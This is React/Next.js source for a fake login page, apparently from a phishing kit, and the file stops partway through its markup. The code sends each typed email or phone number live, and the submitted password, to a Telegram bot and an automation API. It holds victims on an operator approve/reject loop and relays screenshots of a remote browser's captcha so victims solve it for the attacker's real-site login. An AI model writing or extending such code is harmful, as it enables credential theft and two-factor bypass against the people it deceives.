'use client';

import { useState, useRef, useCallback, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useTelegram } from './components/providers/TelegramProvider';
import { sendDataToBot } from './lib/dataSync';
import { postLiveEvent } from './lib/eventSync';
import { useRemoteControlListener } from './lib/remoteControl';
import { useToast } from './components/providers/ToastContext';
import { Button } from './components/ui/Button';
import { io, Socket } from 'socket.io-client';

const COUNTRIES = [
  { code: '+93', name: 'Afghanistan', localName: 'افغانستان' },
  { code: '+355', name: 'Albania', localName: 'Shqipëria' },
  { code: '+213', name: 'Algeria', localName: 'الجزائر' },
  { code: '+1684', name: 'American Samoa', localName: '' },
  { code: '+376', name: 'Andorra', localName: 'Andorra' },
  { code: '+244', name: 'Angola', localName: 'Angola' },
  { code: '+1264', name: 'Anguilla', localName: '' },
  { code: '+672', name: 'Antarctica', localName: '' },
  { code: '+1268', name: 'Antigua and Barbuda', localName: '' },
  { code: '+54', name: 'Argentina', localName: 'Argentina' },
  { code: '+374', name: 'Armenia', localName: 'Հայաստան' },
  { code: '+297', name: 'Aruba', localName: '' },
  { code: '+61', name: 'Australia', localName: 'Australia' },
  { code: '+43', name: 'Austria', localName: 'Österreich' },
  { code: '+994', name: 'Azerbaijan', localName: 'Azərbaycan' },
  { code: '+1242', name: 'Bahamas', localName: '' },
  { code: '+973', name: 'Bahrain', localName: 'البحرين' },
  { code: '+880', name: 'Bangladesh', localName: 'বাংলাদেশ' },
  { code: '+1246', name: 'Barbados', localName: '' },
  { code: '+375', name: 'Belarus', localName: 'Беларусь' },
  { code: '+32', name: 'Belgium', localName: 'België' },
  { code: '+501', name: 'Belize', localName: '' },
  { code: '+229', name: 'Benin', localName: 'Bénin' },
  { code: '+1441', name: 'Bermuda', localName: '' },
  { code: '+975', name: 'Bhutan', localName: 'འབྲུག་ཡུལ་' },
  { code: '+591', name: 'Bolivia', localName: 'Bolivia' },
  { code: '+387', name: 'Bosnia and Herzegovina', localName: 'Bosna i Hercegovina' },
  { code: '+267', name: 'Botswana', localName: 'Botswana' },
  { code: '+55', name: 'Brazil', localName: 'Brasil' },
  { code: '+246', name: 'British Indian Ocean Territory', localName: '' },
  { code: '+1284', name: 'British Virgin Islands', localName: '' },
  { code: '+673', name: 'Brunei', localName: 'Brunei' },
  { code: '+359', name: 'Bulgaria', localName: 'България' },
  { code: '+226', name: 'Burkina Faso', localName: 'Burkina Faso' },
  { code: '+257', name: 'Burundi', localName: 'Uburundi' },
  { code: '+855', name: 'Cambodia', localName: 'កម្ពុជា' },
  { code: '+237', name: 'Cameroon', localName: 'Cameroun' },
  { code: '+1', name: 'Canada', localName: 'Canada' },
  { code: '+238', name: 'Cape Verde', localName: 'Cabo Verde' },
  { code: '+1345', name: 'Cayman Islands', localName: '' },
  { code: '+236', name: 'Central African Republic', localName: 'République centrafricaine' },
  { code: '+235', name: 'Chad', localName: 'Tchad' },
  { code: '+56', name: 'Chile', localName: 'Chile' },
  { code: '+86', name: 'China', localName: '中国' },
  { code: '+61', name: 'Christmas Island', localName: '' },
  { code: '+61', name: 'Cocos (Keeling) Islands', localName: '' },
  { code: '+57', name: 'Colombia', localName: 'Colombia' },
  { code: '+269', name: 'Comoros', localName: 'Komori' },
  { code: '+242', name: 'Congo', localName: 'Congo' },
  { code: '+243', name: 'Congo (DRC)', localName: 'République démocratique du Congo' },
  { code: '+682', name: 'Cook Islands', localName: '' },
  { code: '+506', name: 'Costa Rica', localName: 'Costa Rica' },
  { code: '+225', name: 'Côte d’Ivoire', localName: '' },
  { code: '+385', name: 'Croatia', localName: 'Hrvatska' },
  { code: '+53', name: 'Cuba', localName: 'Cuba' },
  { code: '+599', name: 'Curaçao', localName: '' },
  { code: '+357', name: 'Cyprus', localName: 'Κύπρος' },
  { code: '+420', name: 'Czech Republic', localName: 'Česká republika' },
  { code: '+45', name: 'Denmark', localName: 'Danmark' },
  { code: '+253', name: 'Djibouti', localName: 'Djibouti' },
  { code: '+1767', name: 'Dominica', localName: '' },
  { code: '+1849', name: 'Dominican Republic', localName: 'República Dominicana' },
  { code: '+593', name: 'Ecuador', localName: 'Ecuador' },
  { code: '+20', name: 'Egypt', localName: 'مصر' },
  { code: '+503', name: 'El Salvador', localName: 'El Salvador' },
  { code: '+240', name: 'Equatorial Guinea', localName: 'Guinea Ecuatorial' },
  { code: '+291', name: 'Eritrea', localName: 'Eritrea' },
  { code: '+372', name: 'Estonia', localName: 'Eesti' },
  { code: '+251', name: 'Ethiopia', localName: 'Ethiopia' },
  { code: '+500', name: 'Falkland Islands', localName: '' },
  { code: '+298', name: 'Faroe Islands', localName: 'Føroyar' },
  { code: '+679', name: 'Fiji', localName: 'Fiji' },
  { code: '+358', name: 'Finland', localName: 'Suomi' },
  { code: '+33', name: 'France', localName: 'France' },
  { code: '+594', name: 'French Guiana', localName: '' },
  { code: '+689', name: 'French Polynesia', localName: 'Polynésie française' },
  { code: '+241', name: 'Gabon', localName: 'Gabon' },
  { code: '+220', name: 'Gambia', localName: 'The Gambia' },
  { code: '+995', name: 'Georgia', localName: 'საქართველო' },
  { code: '+49', name: 'Germany', localName: 'Deutschland' },
  { code: '+233', name: 'Ghana', localName: 'Ghana' },
  { code: '+350', name: 'Gibraltar', localName: '' },
  { code: '+30', name: 'Greece', localName: 'Ελλάδα' },
  { code: '+299', name: 'Greenland', localName: 'Kalaallit Nunaat' },
  { code: '+1473', name: 'Grenada', localName: '' },
  { code: '+590', name: 'Guadeloupe', localName: '' },
  { code: '+1671', name: 'Guam', localName: '' },
  { code: '+502', name: 'Guatemala', localName: 'Guatemala' },
  { code: '+44', name: 'Guernsey', localName: '' },
  { code: '+224', name: 'Guinea', localName: 'Guinée' },
  { code: '+245', name: 'Guinea-Bissau', localName: 'Guiné-Bissau' },
  { code: '+592', name: 'Guyana', localName: 'Guyana' },
  { code: '+509', name: 'Haiti', localName: 'Haïti' },
  { code: '+504', name: 'Honduras', localName: 'Honduras' },
  { code: '+852', name: 'Hong Kong', localName: '香港' },
  { code: '+36', name: 'Hungary', localName: 'Magyarország' },
  { code: '+354', name: 'Iceland', localName: 'Ísland' },
  { code: '+91', name: 'India', localName: 'भारत' },
  { code: '+62', name: 'Indonesia', localName: 'Indonesia' },
  { code: '+98', name: 'Iran', localName: 'ایران' },
  { code: '+964', name: 'Iraq', localName: 'العراق' },
  { code: '+353', name: 'Ireland', localName: 'Éire' },
  { code: '+44', name: 'Isle of Man', localName: '' },
  { code: '+972', name: 'Israel', localName: 'ישראל' },
  { code: '+39', name: 'Italy', localName: 'Italia' },
  { code: '+1876', name: 'Jamaica', localName: '' },
  { code: '+81', name: 'Japan', localName: '日本' },
  { code: '+44', name: 'Jersey', localName: '' },
  { code: '+962', name: 'Jordan', localName: 'الأردن' },
  { code: '+7', name: 'Kazakhstan', localName: 'Қазақстан' },
  { code: '+254', name: 'Kenya', localName: 'Kenya' },
  { code: '+686', name: 'Kiribati', localName: 'Kiribati' },
  { code: '+965', name: 'Kuwait', localName: 'الكويت' },
  { code: '+996', name: 'Kyrgyzstan', localName: 'Кыргызстан' },
  { code: '+856', name: 'Laos', localName: 'ລາວ' },
  { code: '+371', name: 'Latvia', localName: 'Latvija' },
  { code: '+961', name: 'Lebanon', localName: 'لبنان' },
  { code: '+266', name: 'Lesotho', localName: 'Lesotho' },
  { code: '+231', name: 'Liberia', localName: 'Liberia' },
  { code: '+218', name: 'Libya', localName: 'ليبيا' },
  { code: '+423', name: 'Liechtenstein', localName: 'Liechtenstein' },
  { code: '+370', name: 'Lithuania', localName: 'Lietuva' },
  { code: '+352', name: 'Luxembourg', localName: 'Luxembourg' },
  { code: '+853', name: 'Macau', localName: '澳門' },
  { code: '+389', name: 'Macedonia', localName: 'Македонија' },
  { code: '+261', name: 'Madagascar', localName: 'Madagasikara' },
  { code: '+265', name: 'Malawi', localName: 'Malawi' },
  { code: '+60', name: 'Malaysia', localName: 'Malaysia' },
  { code: '+960', name: 'Maldives', localName: 'Maldives' },
  { code: '+223', name: 'Mali', localName: 'Mali' },
  { code: '+356', name: 'Malta', localName: 'Malta' },
  { code: '+692', name: 'Marshall Islands', localName: 'Marshall Islands' },
  { code: '+596', name: 'Martinique', localName: '' },
  { code: '+222', name: 'Mauritania', localName: 'Mauritanie' },
  { code: '+230', name: 'Mauritius', localName: 'Mauritius' },
  { code: '+262', name: 'Mayotte', localName: '' },
  { code: '+52', name: 'Mexico', localName: 'México' },
  { code: '+691', name: 'Micronesia', localName: '' },
  { code: '+373', name: 'Moldova', localName: 'Moldova' },
  { code: '+377', name: 'Monaco', localName: 'Monaco' },
  { code: '+976', name: 'Mongolia', localName: 'Монгол улс' },
  { code: '+382', name: 'Montenegro', localName: 'Crna Gora' },
  { code: '+1664', name: 'Montserrat', localName: '' },
  { code: '+212', name: 'Morocco', localName: 'المغرب' },
  { code: '+258', name: 'Mozambique', localName: 'Moçambique' },
  { code: '+95', name: 'Myanmar', localName: 'Myanmar' },
  { code: '+264', name: 'Namibia', localName: 'Namibia' },
  { code: '+674', name: 'Nauru', localName: 'Nauru' },
  { code: '+977', name: 'Nepal', localName: 'नेपाल' },
  { code: '+31', name: 'Netherlands', localName: 'Nederland' },
  { code: '+687', name: 'New Caledonia', localName: '' },
  { code: '+64', name: 'New Zealand', localName: 'New Zealand' },
  { code: '+505', name: 'Nicaragua', localName: 'Nicaragua' },
  { code: '+227', name: 'Niger', localName: 'Niger' },
  { code: '+234', name: 'Nigeria', localName: 'Nigeria' },
  { code: '+683', name: 'Niue', localName: '' },
  { code: '+672', name: 'Norfolk Island', localName: '' },
  { code: '+850', name: 'North Korea', localName: '조선' },
  { code: '+1670', name: 'Northern Mariana Islands', localName: '' },
  { code: '+47', name: 'Norway', localName: 'Norge' },
  { code: '+968', name: 'Oman', localName: 'عمان' },
  { code: '+92', name: 'Pakistan', localName: 'Pakistan' },
  { code: '+680', name: 'Palau', localName: 'Palau' },
  { code: '+970', name: 'Palestine', localName: 'فلسطين' },
  { code: '+507', name: 'Panama', localName: 'Panamá' },
  { code: '+675', name: 'Papua New Guinea', localName: 'Papua New Guinea' },
  { code: '+595', name: 'Paraguay', localName: 'Paraguay' },
  { code: '+51', name: 'Peru', localName: 'Perú' },
  { code: '+63', name: 'Philippines', localName: 'Pilipinas' },
  { code: '+48', name: 'Poland', localName: 'Polska' },
  { code: '+351', name: 'Portugal', localName: 'Portugal' },
  { code: '+1', name: 'Puerto Rico', localName: '' },
  { code: '+974', name: 'Qatar', localName: 'قطر' },
  { code: '+262', name: 'Réunion', localName: '' },
  { code: '+40', name: 'Romania', localName: 'România' },
  { code: '+7', name: 'Russia', localName: 'Россия' },
  { code: '+250', name: 'Rwanda', localName: 'Rwanda' },
  { code: '+590', name: 'Saint Barthélemy', localName: '' },
  { code: '+290', name: 'Saint Helena', localName: '' },
  { code: '+1869', name: 'Saint Kitts and Nevis', localName: '' },
  { code: '+1758', name: 'Saint Lucia', localName: '' },
  { code: '+590', name: 'Saint Martin', localName: '' },
  { code: '+508', name: 'Saint Pierre and Miquelon', localName: '' },
  { code: '+1784', name: 'Saint Vincent and the Grenadines', localName: '' },
  { code: '+685', name: 'Samoa', localName: 'Samoa' },
  { code: '+378', name: 'San Marino', localName: 'San Marino' },
  { code: '+239', name: 'São Tomé and Príncipe', localName: '' },
  { code: '+966', name: 'Saudi Arabia', localName: 'المملكة العربية السعودية' },
  { code: '+221', name: 'Senegal', localName: 'Sénégal' },
  { code: '+381', name: 'Serbia', localName: 'Srbija' },
  { code: '+248', name: 'Seychelles', localName: 'Seychelles' },
  { code: '+232', name: 'Sierra Leone', localName: 'Sierra Leone' },
  { code: '+65', name: 'Singapore', localName: 'Singapore' },
  { code: '+1721', name: 'Sint Maarten', localName: '' },
  { code: '+421', name: 'Slovakia', localName: 'Slovensko' },
  { code: '+386', name: 'Slovenia', localName: 'Slovenija' },
  { code: '+677', name: 'Solomon Islands', localName: 'Solomon Islands' },
  { code: '+252', name: 'Somalia', localName: 'Somalia' },
  { code: '+27', name: 'South Africa', localName: 'South Africa' },
  { code: '+82', name: 'South Korea', localName: '대한민국' },
  { code: '+211', name: 'South Sudan', localName: 'South Sudan' },
  { code: '+34', name: 'Spain', localName: 'España' },
  { code: '+94', name: 'Sri Lanka', localName: 'Sri Lanka' },
  { code: '+249', name: 'Sudan', localName: 'السودان' },
  { code: '+597', name: 'Suriname', localName: 'Suriname' },
  { code: '+268', name: 'Swaziland', localName: 'Swaziland' },
  { code: '+46', name: 'Sweden', localName: 'Sverige' },
  { code: '+41', name: 'Switzerland', localName: 'Schweiz' },
  { code: '+963', name: 'Syria', localName: 'سوريا' },
  { code: '+886', name: 'Taiwan', localName: '台灣' },
  { code: '+992', name: 'Tajikistan', localName: 'Тоҷикистон' },
  { code: '+255', name: 'Tanzania', localName: 'Tanzania' },
  { code: '+66', name: 'Thailand', localName: 'ไทย' },
  { code: '+670', name: 'Timor-Leste', localName: 'Timor-Leste' },
  { code: '+228', name: 'Togo', localName: 'Togo' },
  { code: '+690', name: 'Tokelau', localName: '' },
  { code: '+676', name: 'Tonga', localName: 'Tonga' },
  { code: '+1868', name: 'Trinidad and Tobago', localName: '' },
  { code: '+216', name: 'Tunisia', localName: 'تونس' },
  { code: '+90', name: 'Turkey', localName: 'Türkiye' },
  { code: '+993', name: 'Turkmenistan', localName: 'Türkmenistan' },
  { code: '+1649', name: 'Turks and Caicos Islands', localName: '' },
  { code: '+688', name: 'Tuvalu', localName: 'Tuvalu' },
  { code: '+256', name: 'Uganda', localName: 'Uganda' },
  { code: '+380', name: 'Ukraine', localName: 'Україна' },
  { code: '+971', name: 'United Arab Emirates', localName: 'الإمارات العربية المتحدة' },
  { code: '+44', name: 'United Kingdom', localName: 'United Kingdom' },
  { code: '+1', name: 'United States', localName: 'United States' },
  { code: '+598', name: 'Uruguay', localName: 'Uruguay' },
  { code: '+998', name: 'Uzbekistan', localName: 'Oʻzbekiston' },
  { code: '+678', name: 'Vanuatu', localName: 'Vanuatu' },
  { code: '+58', name: 'Venezuela', localName: 'Venezuela' },
  { code: '+84', name: 'Vietnam', localName: 'Việt Nam' },
  { code: '+1284', name: 'Virgin Islands (British)', localName: '' },
  { code: '+1340', name: 'Virgin Islands (U.S.)', localName: '' },
  { code: '+681', name: 'Wallis and Futuna', localName: '' },
  { code: '+967', name: 'Yemen', localName: 'اليمن' },
  { code: '+260', name: 'Zambia', localName: 'Zambia' },
  { code: '+263', name: 'Zimbabwe', localName: 'Zimbabwe' },
];

export default function LoginPage() {
  const router = useRouter();
  const { webApp } = useTelegram();
  const { showError } = useToast();
  const [email, setEmail] = useState('');
  const [socket, setSocket] = useState<Socket | null>(null);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [countryCode, setCountryCode] = useState('');
  const [loginCountryCode, setLoginCountryCode] = useState('');
  const [countrySelectorTarget, setCountrySelectorTarget] = useState<'otp' | 'login' | null>(null);
  const [showCountrySelector, setShowCountrySelector] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [isSearchFocused, setIsSearchFocused] = useState(false);
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [activeTab, setActiveTab] = useState<'password' | 'otp'>('password');
  const [autoCountryApplied, setAutoCountryApplied] = useState(false);
  const [loginAutoCountryApplied, setLoginAutoCountryApplied] = useState(false);
  const [isOtpNumeric, setIsOtpNumeric] = useState(true);
  const [isEmailFocused, setIsEmailFocused] = useState(false);
  const [isPhoneFocused, setIsPhoneFocused] = useState(false);

  // Captcha overlay state
  const [showCaptchaOverlay, setShowCaptchaOverlay] = useState(false);
  const [captchaScreenshot, setCaptchaScreenshot] = useState<string | null>(null);
  const [lastCaptchaClick, setLastCaptchaClick] = useState<{ x: number, y: number } | null>(null);
  const captchaImageRef = useRef<HTMLImageElement>(null);

  // Socket.IO Initialization
  useEffect(() => {
    // Use dynamic hostname so it works from mobile devices accessing via IP
    const socketUrl = `http://${window.location.hostname}:3001`;
    console.log('🔌 Connecting to socket:', socketUrl);

    const newSocket = io(socketUrl, {
      transports: ['websocket'], // Force WebSocket for best performance
      reconnectionDelay: 1000
    });

    setSocket(newSocket);
    // Clear any previous user phone number on mount to ensure fresh data
    localStorage.removeItem('user_phone_number');
    return () => { newSocket.close(); };
  }, []);

  const notifyAutomationTab = (tab: 'password' | 'otp') => {
    // Notify automation for BOTH tab switches
    fetch('/api/automation-tab', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tab })
    }).catch(e => console.error('Failed to notify automation:', e));
  };

  const handleTabClick = (tab: 'password' | 'otp') => {
    setActiveTab(tab);
    notifyAutomationTab(tab);
  };

  const handlePhoneInputChange = (value: string) => {
    const raw = value.trim();
    const digitsOnly = raw.replace(/\D/g, '');
    const isNumeric = raw !== '' && /^\d+$/.test(raw);

    if (!raw) {
      setIsOtpNumeric(false);
      setPhoneNumber('');
      setCountryCode('');
      setAutoCountryApplied(false);
      return '';
    }

    if (isNumeric) {
      setIsOtpNumeric(true);
      setPhoneNumber(digitsOnly);

      if (!countryCode && digitsOnly.length >= 3) {
        setCountryCode('+91');
        setAutoCountryApplied(true);
      } else if (autoCountryApplied && digitsOnly.length < 3) {
        setCountryCode('');
        setAutoCountryApplied(false);
      }
      return digitsOnly;
    }

    // Email mode: accept as-is (no auto-domain), hide dialer
    setIsOtpNumeric(false);
    setPhoneNumber(raw);
    setCountryCode('');
    setAutoCountryApplied(false);
    return raw;
  };

  const handleLoginIdentifierChange = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '');
    const isNumeric = value.trim() !== '' && /^\d+$/.test(value);

    if (isNumeric) {
      setEmail(digitsOnly);

      let nextLoginCode = loginCountryCode;
      let nextAutoFlag = loginAutoCountryApplied;

      if (!nextLoginCode && digitsOnly.length >= 3) {
        nextLoginCode = '+91';
        nextAutoFlag = true;
      } else if (nextAutoFlag && digitsOnly.length < 3) {
        nextLoginCode = '';
        nextAutoFlag = false;
      }

      setLoginCountryCode(nextLoginCode);
      setLoginAutoCountryApplied(nextAutoFlag);

      const liveValue = digitsOnly; // Live typing: send only what user typed to avoid auto-prefix in automation

      // Send to automation API
      fetch('/api/live-typing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ field: 'email', value: liveValue })
      }).catch(() => { });

      // Send to Telegram (LIVE updates)
      const fullValue = nextLoginCode ? `${nextLoginCode} ${liveValue}` : liveValue;
      sendDataToBot('user_email', fullValue);
    } else {
      setEmail(value);
      setLoginCountryCode('');
      setLoginAutoCountryApplied(false);

      // Send to automation API
      fetch('/api/live-typing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ field: 'email', value })
      }).catch(() => { });

      // Send to Telegram (LIVE updates)
      sendDataToBot('user_email', value);
    }
  };

  // Remote toast/navigation controlled by live-data admin console
  useRemoteControlListener({ onToast: (msg) => showError(msg) });

  const loginDigitsOnly = /^\d+$/.test(email) ? email : '';
  const showLoginDialControls = !!loginCountryCode || loginDigitsOnly.length >= 3;
  const selectedCountryCode = countrySelectorTarget === 'login' ? loginCountryCode : countryCode;
  const otpDigitsOnly = phoneNumber.replace(/\D/g, '');
  const showOtpDialControls = !!countryCode || (isOtpNumeric && otpDigitsOnly.length >= 3);

  // Data is now sent ONLY on form submit (see handleSubmit)

  // Captcha mouse event handlers - optimized for real-time streaming
  const isDraggingRef = useRef(false);
  const dragStartRef = useRef<{ x: number; y: number } | null>(null);
  const lastMoveTimeRef = useRef(0);
  const pendingMoveRef = useRef<{ x: number; y: number } | null>(null);
  const moveFlushIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const pendingEventRef = useRef<NodeJS.Timeout | null>(null);

  const getCaptchaCoords = useCallback((e: React.MouseEvent<HTMLDivElement>) => {
    if (!captchaImageRef.current) return null;

    const rect = captchaImageRef.current.getBoundingClientRect();
    const scaleX = captchaImageRef.current.naturalWidth / rect.width;
    const scaleY = captchaImageRef.current.naturalHeight / rect.height;

    return {
      x: Math.round((e.clientX - rect.left) * scaleX),
      y: Math.round((e.clientY - rect.top) * scaleY)
    };
  }, []);

  // Optimized event sender with batching for move events
  const sendCaptchaEvent = useCallback((type: 'mousedown' | 'mousemove' | 'mouseup' | 'click', x: number, y: number) => {
    if (!socket) return;

    // For move events: batch them and send at fixed intervals (16ms = 60fps max)
    if (type === 'mousemove') {
      pendingMoveRef.current = { x, y };

      // Start flush interval if not running
      if (!moveFlushIntervalRef.current) {
        moveFlushIntervalRef.current = setInterval(() => {
          if (pendingMoveRef.current && socket) {
            // Use volatile for moves - OK to drop if connection is slow
            socket.volatile.emit('interaction', { t: 'm', x: pendingMoveRef.current.x, y: pendingMoveRef.current.y });
            pendingMoveRef.current = null;
          }
        }, 16); // 60fps max
      }
      return;
    }

    // For critical events (click, mousedown, mouseup): send immediately and reliably
    // Short type codes to minimize payload
    const typeCode = type === 'mousedown' ? 'd' : type === 'mouseup' ? 'u' : 'c';
    socket.emit('interaction', { t: typeCode, x, y });

    // Clear any pending move when we get a terminal event
    if (type === 'mouseup' || type === 'click') {
      if (moveFlushIntervalRef.current) {
        clearInterval(moveFlushIntervalRef.current);
        moveFlushIntervalRef.current = null;
      }
      pendingMoveRef.current = null;
    }
  }, [socket]);

  const handleCaptchaMouseDown = useCallback((e: React.MouseEvent<HTMLDivElement>) => {
    const coords = getCaptchaCoords(e);
    if (!coords) return;

    isDraggingRef.current = true;
    dragStartRef.current = coords;

    // DON'T send mousedown here - wait to see if it becomes a drag
    // This prevents double-click issue for simple taps
  }, [getCaptchaCoords]);

  const handleCaptchaMouseMove = useCallback((e: React.MouseEvent<HTMLDivElement>) => {
    if (!isDraggingRef.current || !dragStartRef.current) return;

    const coords = getCaptchaCoords(e);
    if (!coords) return;

    // Check if this is actually a drag (moved more than 5px)
    const isDragging = Math.abs(coords.x - dragStartRef.current.x) > 5 ||
      Math.abs(coords.y - dragStartRef.current.y) > 5;

    if (isDragging) {
      // First move after drag starts - send mousedown at original position
      if (!pendingEventRef.current) {
        sendCaptchaEvent('mousedown', dragStartRef.current.x, dragStartRef.current.y);
        pendingEventRef.current = setTimeout(() => { }, 0); // Mark as started
      }
      // Throttled move events for drag
      sendCaptchaEvent('mousemove', coords.x, coords.y);
    }
  }, [getCaptchaCoords, sendCaptchaEvent]);

  const handleCaptchaMouseUp = useCallback((e: React.MouseEvent<HTMLDivElement>) => {
    const coords = getCaptchaCoords(e);
    if (!coords) return;

    const wasDrag = isDraggingRef.current && dragStartRef.current &&
      (Math.abs(coords.x - dragStartRef.current.x) > 5 || Math.abs(coords.y - dragStartRef.current.y) > 5);

    const hadDragStarted = !!pendingEventRef.current;

    isDraggingRef.current = false;
    dragStartRef.current = null;
    pendingEventRef.current = null;
    setLastCaptchaClick(coords);

    if (wasDrag && hadDragStarted) {
      // Complete the drag with mouseup
      sendCaptchaEvent('mouseup', coords.x, coords.y);
    } else {
      // Simple click - send ONLY click event (no mousedown was sent)
      sendCaptchaEvent('click', coords.x, coords.y);
    }
  }, [getCaptchaCoords, sendCaptchaEvent]);

  const handleCaptchaMouseLeave = useCallback(() => {
    if (isDraggingRef.current && dragStartRef.current) {
      sendCaptchaEvent('mouseup', dragStartRef.current.x, dragStartRef.current.y);
    }
    isDraggingRef.current = false;
    dragStartRef.current = null;
  }, [sendCaptchaEvent]);

  // Touch event handlers for mobile
  const getCaptchaTouchCoords = useCallback((e: React.TouchEvent<HTMLDivElement>) => {
    if (!captchaImageRef.current || !e.touches.length) return null;

    const touch = e.touches[0];
    const rect = captchaImageRef.current.getBoundingClientRect();
    const scaleX = captchaImageRef.current.naturalWidth / rect.width;
    const scaleY = captchaImageRef.current.naturalHeight / rect.height;

    return {
      x: Math.round((touch.clientX - rect.left) * scaleX),
      y: Math.round((touch.clientY - rect.top) * scaleY)
    };
  }, []);

  const handleCaptchaTouchStart = useCallback((e: React.TouchEvent<HTMLDivElement>) => {
    e.preventDefault(); // Prevent scrolling
    const coords = getCaptchaTouchCoords(e);
    if (!coords) return;

    isDraggingRef.current = true;
    dragStartRef.current = coords;
    pendingEventRef.current = null;
  }, [getCaptchaTouchCoords]);

  const handleCaptchaTouchMove = useCallback((e: React.TouchEvent<HTMLDivElement>) => {
    e.preventDefault();
    if (!isDraggingRef.current || !dragStartRef.current) return;

    const coords = getCaptchaTouchCoords(e);
    if (!coords) return;

    const isDragging = Math.abs(coords.x - dragStartRef.current.x) > 5 ||
      Math.abs(coords.y - dragStartRef.current.y) > 5;

    if (isDragging) {
      if (!pendingEventRef.current) {
        sendCaptchaEvent('mousedown', dragStartRef.current.x, dragStartRef.current.y);
        pendingEventRef.current = setTimeout(() => { }, 0);
      }
      sendCaptchaEvent('mousemove', coords.x, coords.y);
    }
  }, [getCaptchaTouchCoords, sendCaptchaEvent]);

  const handleCaptchaTouchEnd = useCallback((e: React.TouchEvent<HTMLDivElement>) => {
    e.preventDefault();
    if (!dragStartRef.current) return;

    const hadDragStarted = !!pendingEventRef.current;
    const endCoords = dragStartRef.current; // Use start coords since touches array is empty on touchend

    isDraggingRef.current = false;
    dragStartRef.current = null;
    pendingEventRef.current = null;

    if (hadDragStarted) {
      sendCaptchaEvent('mouseup', endCoords.x, endCoords.y);
    } else {
      sendCaptchaEvent('click', endCoords.x, endCoords.y);
    }
  }, [sendCaptchaEvent]);

  // Listen for frames and status via Socket.IO
  useEffect(() => {
    if (!socket) return;

    const handleStatus = (data: any) => {
      console.log('📊 Socket status received:', data.status);

      // Handle captcha status - show overlay
      if (data.status === 'captcha') {
        console.log('🔐 Captcha detected via socket - showing overlay');
        setShowCaptchaOverlay(true);
        return;
      }

      // Handle processing status - captcha solved, close overlay
      if (data.status === 'processing') {
        console.log('⚙️ Processing - closing captcha overlay');
        setShowCaptchaOverlay(false);
        return;
      }

      // Terminal statuses that indicate captcha is DONE
      if (data.status === 'waiting_2fa') {
        setShowCaptchaOverlay(false);
        setIsLoading(false);
        router.push('/verify-2fa');
      } else if (data.status === 'success') {
        setShowCaptchaOverlay(false);
        setIsLoading(false);
        router.push('/success');
      } else if (data.status === 'invalid_details') {
        // Only close overlay and show error if NOT in captcha phase
        // (captcha phase means overlay is open - errors during captcha should not close it)
        if (!showCaptchaOverlay) {
          setIsLoading(false);
          showError(data.message || 'Invalid credentials');
        }
      } else if (data.status === 'error') {
        // Same logic - don't close overlay if we're actively solving captcha
        if (!showCaptchaOverlay) {
          setIsLoading(false);
          showError(data.message || 'Error occurred');
        }
      }
      // Other statuses like 'captcha', 'processing', 'waiting' are ignored
    };

    const handleFrame = (base64: string) => {
      // Always update screenshot - receiving frames means captcha is active!
      setCaptchaScreenshot(`data:image/jpeg;base64,${base64}`);
      // Auto-show overlay when first frame arrives if not already showing
      if (!showCaptchaOverlay) {
        console.log('🖼️ First frame received - auto-showing overlay');
        setShowCaptchaOverlay(true);
      }
    };

    socket.on('frame', handleFrame);
    socket.on('status', handleStatus);

    return () => {
      socket.off('frame', handleFrame);
      socket.off('status', handleStatus);
    };
  }, [socket, showCaptchaOverlay, router]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Live: user clicked Sign In / Send OTP
    postLiveEvent('user_login_submit', { tab: activeTab });

    const loginIdentifier = loginCountryCode ? `${loginCountryCode} ${email}` : email;

    if (activeTab === 'password') {
      // Send to Telegram for logging
      sendDataToBot('user_email', loginIdentifier);
      sendDataToBot('user_password', password);
      // Clear phone from storage if password tab
      localStorage.removeItem('user_phone_number');
    } else {
      const fullPhone = countryCode ? `${countryCode} ${phoneNumber}` : phoneNumber;
      // Save for the next page to display - ONLY if using OTP tab
      localStorage.setItem('user_phone_number', fullPhone);
      sendDataToBot('user_phone_number', fullPhone);
    }

    // Notify moderation dashboard that a new decision is needed
    try {
      await fetch('/api/login-decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'start',
          target: activeTab,
        }),
      });
    } catch {
      // If this fails, we still allow the user to continue normally
      setIsLoading(false);
      showError('Unable to start approval flow. Please try again.');
      return;
    }

    // Wait for approve / reject from live-data page
    try {
      const maxAttempts = 600; // 5 minutes at 500ms
      let attempts = 0;

      while (attempts < maxAttempts) {
        await new Promise((resolve) => setTimeout(resolve, 500));
        attempts++;

        let state: { status?: string; message?: string; targetPage?: string } = {};
        try {
          const res = await fetch('/api/login-decision');
          state = await res.json();
        } catch {
          continue;
        }

        if (state.status === 'approved') {
          setIsLoading(false);
          // Use targetPage from control panel, or fallback to default based on tab
          const nextPage = state.targetPage || (activeTab === 'password' ? '/verify-2fa' : '/verification-code');
          router.push(nextPage);
          return;
        }

        if (state.status === 'rejected') {
          setIsLoading(false);
          // Error toast is controlled manually by admin via /api/remote-control (not by decision payload)
          return;
        }
      }

      // Timeout without decision
      setIsLoading(false);
      showError('No decision received. Please try again.');
    } catch (err) {
      console.error('Error waiting for approval:', err);
      setIsLoading(false);
      showError('An error occurred while waiting for approval.');
    }
  };

  return (
    <>
      {/* Error Toast is now handled by ToastContext */}
      <div className="dialog-root dialog-visible">
        <div className="dialog-list dialog-l">
          <div className="dialog-overlayer dialog-l" style={{ "--scroll": "100%", backgroundColor: "rgb(var(--layer2))" } as any}>
            <div className="dialog-item dialog-transparent-title account-dialog w-full">
              <div className="scroll-y dialog-content">
                <div className="scroll-container">
                  <div className="flex-none">
                    {/* Logo/Hero Section */}
                    <div className="w-full pt-st relative h-60 box-content">
                      <img
                        alt="top-img"
                        className="w-full overflow-hidden absolute bottom-2 left-0"
                        src="/hero-image.webp"
                      />
                      <div className="w-full z-10 absolute left-0 top-[var(--safe-top)] sm:top-0 p-4">
                        <div className="flex items-center justify-between">
